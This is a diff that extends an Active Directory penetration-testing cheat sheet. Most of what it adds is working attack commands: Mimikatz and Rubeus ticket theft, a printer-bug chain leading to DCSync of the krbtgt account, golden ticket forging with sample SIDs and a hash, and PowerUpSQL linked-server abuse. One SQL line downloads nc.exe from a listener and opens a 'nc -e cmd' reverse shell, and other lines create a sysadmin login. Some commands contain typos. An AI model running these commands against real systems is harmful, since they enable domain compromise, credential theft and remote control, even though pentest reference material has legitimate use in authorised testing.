@@ -55,7 +55,23 @@ net user /domain
 
 enum4linux <target> |grep "user:" | cut -d '[' -f2 | cut -d "]" -f1 > users.txt
 
+$Searcher = New-Object DirectoryServices.DirectorySearcher
+$Searcher.Filter = "(&(objectclass=computer))"
+$Searcher.SearchRoot = ''
+$Searcher.FindAll()
+
 Get-NetUser | select samaccountname
+```
+
+### Users with SPN
+
+```bash
+$Searcher = New-Object DirectoryServices.DirectorySearcher
+$Searcher.Filter = "(&(!(samaccountname=krbtgt))(objectclass=user)(objectcategory=user)(servicePrincipalName=*))"
+$Searcher.SearchRoot = ''
+$Searcher.FindAll()
+
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
 ```
 
 
@@ -79,6 +95,8 @@ Find DC IP
 cat /etc/resolv.conf
 
 nslookup <domain>
+
+$Searcher = New-Object DirectoryServices.DirectorySearcher ; $Searcher.Filter = "(&(objectclass=user))" ; $Searcher.SearchRoot = '' ; $Searcher.FindAll()
 
 Get-NetDomainController
 ```
@@ -167,10 +185,11 @@ mount <target>:/home/xx /mnt/yy
 ### Forest enumeration
 
 ```bash
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+
 Get-NetForest
 Get-NetForestCatalog
 Get-NetForestTrust
-Get-NetUser -SPN | select samaccountname,serviceprincipalname
 ```
 
 ---
@@ -246,10 +265,12 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 
 # Mimikatz
 .\mimikatz.exe "log" "privilege::debug" "kerberos::list /export" exit
+Invoke-Mimikatz -Command '"kereberos::list /export"'
 
 # Rubeus
 Rubeus.exe klist
 Rubeus.exe dump
+Rubeus.exe monitor /interval:5 /nowrap ; MS-RPRN.exe \\<DC.fqdn> \\<target.fqdn> ; Rubeus.exe ptt /ticket:<TGT_of_DC$> ; Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"' ; enter-pssessions -computername <DC.fqdn>
 ```
 
 ---
@@ -329,6 +350,20 @@ net user add <user> <pass> /domain
 net group "Domain Admins" <user> /add
 ```
 
+### Golden Ticket
+
+```bash
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<pwned_domain.fqdn> /sid:<pwned_domain_sid> /sids:<enterprise_admin_sid> /krbtgt:<krbtgt_hash> /ticket:krbtgt.kirbi"'
+Invoke-Mimikatz -Command '"kerberos::ptt krbtgt.kirbi"'
+ls \\<target_DC.fqdn>\C$
+
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+Invoke-Mimikatz -Command '"lsadump::dcsyn /domain:<domain.fqdn> /all"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<pwned_domain.fqdn> /sid:S-1-5-21-77175520-687805270-358672322 /sids:S-1-5-21-1458491649-1432147247-1990877046-519 /krbtgt:1ee3a9c4a96c4450878eaa8cb45b29fb /ptt"'
+gwmi -class win32_operatingsystem -ComputerName <target_DC.fqdn>
+```
+
+
 ---
 
 ### Manual testing
@@ -341,11 +376,23 @@ net group "Domain Admins" <user> /add
 
 ## **SQL exploit**
 
+Trusted Links (pwn even across forests trusts)
+
 ```bash
 .\PowerUpSQL.ps1
+Get-SQLInstanceLocal
+Get-SQLInstanceDomain
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded
-Get-SQLServerLink -Instance <fqdn_db_target> -Verbose
-Get-SQLServerLinkCrawl -Instance <fqdn_db_target>
+
+Get-SQLServerLink  -Verbose -Instance <fqdn_db_target>
+Get-SQLServerLinkCrawl  -Verbose -Instance <fqdn_db_target>
+Get-SQLServerLinkCrawl  -Verbose -Instance <fqdn_db_target> -Query 'exec master..xp_cmdshell "whoami"'
+Get-SQLServerLinkCrawl  -verbose -Instance <fqdn_db1> -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<fqdn_db2>"'
+Get-SQLServerLinkCrawl -Instance <fqdn_db_target> -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadFile(''http://<listener_ip>/nc.exe'',''C:\Windows\Temp\nc.exe'')"' ; Get-SQLServerLinkCrawl -Instance <fqdn_db_target> -Query 'exec master..xp_cmdshell "C:\Windows\Temp\nc.exe -e cmd <listener_ip> 1234"'
+
+Invoke-SQLEscalatePriv -Verbose -Instance "SQLServer1\Instance1"
+
 Invoke-SQLAudit -Verbose -Instance <db_target>
 
 SELECT IS_SRVROLEMEMBER ('sysadmin') , IS_MEMBER ('db_owner'), USER_NAME()
@@ -354,12 +401,18 @@ SELECT IS_SRVROLEMEMBER ('sysadmin') , IS_MEMBER ('db_owner'), USER_NAME()
 
 EXECUTE AS USER='dbo'
 ALTER SERVER ROLE [sysadmin]
-ADD MEMBER [<domain\sql_svcuser>]
+ADD MEMBER [<domain\sql_svc_user>]
 EXEC sp_configure 'show advanced options',1
 
 EXEC sp_configure 'xp_cmdshell',1
 EXEC master..xp_cmdshell 'whoami'
 
+#Create user and give admin privileges
+EXECUTE('EXECUTE(''CREATE LOGIN <user> WITH PASSWORD = ''''<pass>'''' '') AT "<domain>\<server1>"') AT "<domain>\<server2>"
+EXECUTE('EXECUTE(''sp_addsrvrolemember ''''<user>'''' , ''''sysadmin'''' '') AT "<domain>\<server1>"') AT "<domain>\<server2>"
+
 # Remediation
 REVOKE Execute ON xp_dirtree FROM PUBLIC
 ```
+
+
